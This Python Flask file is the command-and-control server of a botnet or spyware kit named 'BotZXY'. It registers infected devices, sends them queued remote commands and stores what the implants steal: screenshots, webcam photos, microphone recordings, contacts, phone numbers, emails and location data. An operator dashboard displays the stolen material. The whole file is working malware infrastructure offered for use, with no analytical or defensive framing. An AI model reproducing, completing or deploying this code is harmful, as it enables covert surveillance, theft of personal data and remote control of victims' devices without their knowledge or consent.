from flask import Flask, request, jsonify, render_template, send_file
from flask_socketio import SocketIO, emit
from flask_cors import CORS
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user
import sqlite3
import json
import base64
import os
import time
from datetime import datetime
import hashlib
import hmac
from cryptography.fernet import Fernet
import threading
import queue
import logging

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'BotZXY_Secret_Key_2026_ULTRA_SECURE')
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database/botzxy_c2.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")

# Auth setup
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

# Database
DB_PATH = 'database/botzxy_c2.db'

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            api_key TEXT UNIQUE NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.execute('''
        CREATE TABLE IF NOT EXISTS devices (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT UNIQUE NOT NULL,
            user_id INTEGER REFERENCES users(id),
            platform TEXT,
            hostname TEXT,
            ip TEXT,
            country TEXT,
            os_version TEXT,
            is_online BOOLEAN DEFAULT 1,
            last_seen TIMESTAMP,
            registered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            memory_info TEXT,
            storage_info TEXT,
            camera_count INTEGER DEFAULT 0,
            has_microphone BOOLEAN DEFAULT 0,
            phone_number TEXT,
            email TEXT,
            contacts TEXT,
            bot_name TEXT DEFAULT 'BotZXY'
        )
    ''')
    conn.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT REFERENCES devices(device_id),
            command TEXT NOT NULL,
            params TEXT,
            status TEXT DEFAULT 'pending',
            result TEXT,
            executed_at TIMESTAMP,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.execute('''
        CREATE TABLE IF NOT EXISTS captures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT REFERENCES devices(device_id),
            type TEXT CHECK(type IN ('screenshot', 'webcam', 'mic', 'clipboard', 'location')),
            data TEXT,
            file_path TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            action TEXT,
            details TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

# User model for Flask-Login
class User(UserMixin):
    def __init__(self, id, username, api_key):
        self.id = id
        self.username = username
        self.api_key = api_key

@login_manager.user_loader
def load_user(user_id):
    conn = get_db()
    user = conn.execute('SELECT id, username, api_key FROM users WHERE id = ?', (user_id,)).fetchone()
    conn.close()
    if user:
        return User(user['id'], user['username'], user['api_key'])
    return None

# Routes
@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        conn = get_db()
        user = conn.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
        conn.close()
        if user and hashlib.sha256(password.encode()).hexdigest() == user['password_hash']:
            login_user(User(user['id'], user['username'], user['api_key']))
            return render_template('dashboard.html')
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return index()

@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html')

@app.route('/device/<device_id>')
@login_required
def device_detail(device_id):
    return render_template('device.html', device_id=device_id)

# API ROUTES - Bot Communication
@app.route('/api/register', methods=['POST'])
def register_device():
    data = request.json
    device_id = data.get('device_id')
    platform = data.get('platform')
    hostname = data.get('hostname')
    ip = request.remote_addr
    os_version = data.get('os_version')
    
    conn = get_db()
    # Check if device exists
    existing = conn.execute('SELECT * FROM devices WHERE device_id = ?', (device_id,)).fetchone()
    if existing:
        conn.execute('UPDATE devices SET last_seen = CURRENT_TIMESTAMP, is_online = 1, ip = ? WHERE device_id = ?', 
                    (ip, device_id))
        conn.commit()
        conn.close()
        return jsonify({'status': 'updated', 'bot': 'BotZXY'})
    
    conn.execute('''
        INSERT INTO devices (device_id, platform, hostname, ip, os_version, last_seen, is_online, bot_name)
        VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP, 1, 'BotZXY')
    ''', (device_id, platform, hostname, ip, os_version))
    conn.commit()
    conn.close()
    
    log_action(device_id, 'register', f'New BotZXY device: {hostname} ({platform})')
    
    return jsonify({'status': 'registered', 'device_id': device_id, 'bot': 'BotZXY'})

@app.route('/api/poll/<device_id>', methods=['GET'])
def poll_commands(device_id):
    conn = get_db()
    # Update last seen
    conn.execute('UPDATE devices SET last_seen = CURRENT_TIMESTAMP, is_online = 1 WHERE device_id = ?', (device_id,))
    conn.commit()
    
    # Get pending commands
    commands = conn.execute('''
        SELECT id, command, params FROM commands 
        WHERE device_id = ? AND status = 'pending' 
        ORDER BY created_at ASC LIMIT 10
    ''', (device_id,)).fetchall()
    conn.close()
    
    return jsonify([dict(cmd) for cmd in commands])

@app.route('/api/command/<device_id>', methods=['POST'])
@login_required
def send_command(device_id):
    data = request.json
    command = data.get('command')
    params = data.get('params', '')
    
    conn = get_db()
    conn.execute('''
        INSERT INTO commands (device_id, command, params, status)
        VALUES (?, ?, ?, 'pending')
    ''', (device_id, command, params))
    conn.commit()
    conn.close()
    
    log_action(device_id, 'command_sent', f'BotZXY Command: {command} {params}')
    socketio.emit('command_sent', {'device_id': device_id, 'command': command, 'bot': 'BotZXY'})
    
    return jsonify({'status': 'command_queued'})

@app.route('/api/result/<device_id>', methods=['POST'])
def command_result(device_id):
    data = request.json
    command_id = data.get('command_id')
    result = data.get('result')
    status = data.get('status', 'executed')
    
    conn = get_db()
    conn.execute('''
        UPDATE commands SET status = ?, result = ?, executed_at = CURRENT_TIMESTAMP
        WHERE id = ? AND device_id = ?
    ''', (status, result, command_id, device_id))
    conn.commit()
    conn.close()
    
    socketio.emit('result_received', {'device_id': device_id, 'command_id': command_id, 'bot': 'BotZXY'})
    return jsonify({'status': 'recorded'})

@app.route('/api/screenshot/<device_id>', methods=['POST'])
def upload_screenshot(device_id):
    data = request.json
    image_data = data.get('image_base64')
    timestamp = data.get('timestamp', datetime.now().isoformat())
    
    conn = get_db()
    conn.execute('''
        INSERT INTO captures (device_id, type, data, created_at)
        VALUES (?, 'screenshot', ?, CURRENT_TIMESTAMP)
    ''', (device_id, image_data))
    conn.commit()
    conn.close()
    
    log_action(device_id, 'screenshot_captured', f'BotZXY Screenshot at {timestamp}')
    socketio.emit('screenshot_captured', {'device_id': device_id, 'bot': 'BotZXY'})
    
    return jsonify({'status': 'saved'})

@app.route('/api/webcam/<device_id>', methods=['POST'])
def upload_webcam(device_id):
    data = request.json
    image_data = data.get('image_base64')
    
    conn = get_db()
    conn.execute('''
        INSERT INTO captures (device_id, type, data, created_at)
        VALUES (?, 'webcam', ?, CURRENT_TIMESTAMP)
    ''', (device_id, image_data))
    conn.commit()
    conn.close()
    
    log_action(device_id, 'webcam_captured', 'BotZXY Webcam photo')
    socketio.emit('webcam_captured', {'device_id': device_id, 'bot': 'BotZXY'})
    
    return jsonify({'status': 'saved'})

@app.route('/api/mic/<device_id>', methods=['POST'])
def upload_mic(device_id):
    data = request.json
    audio_data = data.get('audio_base64')
    duration = data.get('duration', 10)
    
    conn = get_db()
    conn.execute('''
        INSERT INTO captures (device_id, type, data, created_at)
        VALUES (?, 'mic', ?, CURRENT_TIMESTAMP)
    ''', (device_id, audio_data))
    conn.commit()
    conn.close()
    
    log_action(device_id, 'mic_recorded', f'BotZXY Audio capture {duration}s')
    return jsonify({'status': 'saved'})

@app.route('/api/contacts/<device_id>', methods=['POST'])
def upload_contacts(device_id):
    data = request.json
    phone_number = data.get('phone_number')
    email = data.get('email')
    contacts = json.dumps(data.get('contacts', []))
    
    conn = get_db()
    conn.execute('''
        UPDATE devices SET phone_number = ?, email = ?, contacts = ?
        WHERE device_id = ?
    ''', (phone_number, email, contacts, device_id))
    conn.commit()
    conn.close()
    
    log_action(device_id, 'contacts_extracted', f'BotZXY Phone: {phone_number}, Email: {email}')
    return jsonify({'status': 'saved'})

@app.route('/api/location/<device_id>', methods=['POST'])
def upload_location(device_id):
    data = request.json
    location_data = json.dumps(data.get('location', {}))
    
    conn = get_db()
    conn.execute('''
        INSERT INTO captures (device_id, type, data, created_at)
        VALUES (?, 'location', ?, CURRENT_TIMESTAMP)
    ''', (device_id, location_data))
    conn.commit()
    conn.close()
    
    log_action(device_id, 'location_updated', f'BotZXY Location: {location_data[:100]}')
    return jsonify({'status': 'saved'})

@app.route('/api/devices', methods=['GET'])
@login_required
def get_devices():
    conn = get_db()
    devices = conn.execute('''
        SELECT device_id, platform, hostname, ip, os_version, is_online, last_seen, 
               registered_at, phone_number, email, bot_name
        FROM devices ORDER BY last_seen DESC
    ''').fetchall()
    conn.close()
    return jsonify([dict(d) for d in devices])

@app.route('/api/device/<device_id>', methods=['GET'])
@login_required
def get_device_detail(device_id):
    conn = get_db()
    device = conn.execute('SELECT * FROM devices WHERE device_id = ?', (device_id,)).fetchone()
    if not device:
        return jsonify({'error': 'Device not found'}), 404
    
    captures = conn.execute('''
        SELECT type, data, created_at FROM captures 
        WHERE device_id = ? ORDER BY created_at DESC LIMIT 20
    ''', (device_id,)).fetchall()
    
    commands = conn.execute('''
        SELECT command, params, status, result, created_at, executed_at 
        FROM commands WHERE device_id = ? ORDER BY created_at DESC LIMIT 20
    ''', (device_id,)).fetchall()
    
    conn.close()
    return jsonify({
        'device': dict(device),
        'captures': [dict(c) for c in captures],
        'commands': [dict(c) for c in commands]
    })

@app.route('/api/capture/<capture_id>', methods=['GET'])
@login_required
def get_capture(capture_id):
    conn = get_db()
    capture = conn.execute('SELECT * FROM captures WHERE id = ?', (capture_id,)).fetchone()
    conn.close()
    if not capture:
        return jsonify({'error': 'Capture not found'}), 404
    return jsonify(dict(capture))

@app.route('/api/logs/<device_id>', methods=['GET'])
@login_required
def get_logs(device_id):
    conn = get_db()
    logs = conn.execute('''
        SELECT action, details, timestamp FROM logs 
        WHERE device_id = ? ORDER BY timestamp DESC LIMIT 50
    ''', (device_id,)).fetchall()
    conn.close()
    return jsonify([dict(l) for l in logs])

# Utility functions
def log_action(device_id, action, details):
    conn = get_db()
    conn.execute('''
        INSERT INTO logs (device_id, action, details)
        VALUES (?, ?, ?)
    ''', (device_id, action, details))
    conn.commit()
    conn.close()

def setup_admin_user():
    conn = get_db()
    admin = conn.execute('SELECT * FROM users WHERE username = "admin"').fetchone()
    if not admin:
        api_key = hashlib.sha256(os.urandom(32)).hexdigest()
        conn.execute('''
            INSERT INTO users (username, password_hash, api_key)
            VALUES (?, ?, ?)
        ''', ('admin', hashlib.sha256('BotZXY2026!'.encode()).hexdigest(), api_key))
        conn.commit()
        print(f'[+] BotZXY Admin created: admin / BotZXY2026!')
        print(f'[+] API Key: {api_key}')
    conn.close()

# WebSocket events
@socketio.on('connect')
def handle_connect():
    print('[+] BotZXY Client connected via WebSocket')

@socketio.on('disconnect')
def handle_disconnect():
    print('[-] BotZXY Client disconnected')

@socketio.on('command_status')
def handle_command_status(data):
    emit('command_update', data, broadcast=True)

if __name__ == '__main__':
    init_db()
    setup_admin_user()
    port = int(os.environ.get('PORT', 5000))
    socketio.run(app, host='0.0.0.0', port=port, debug=False)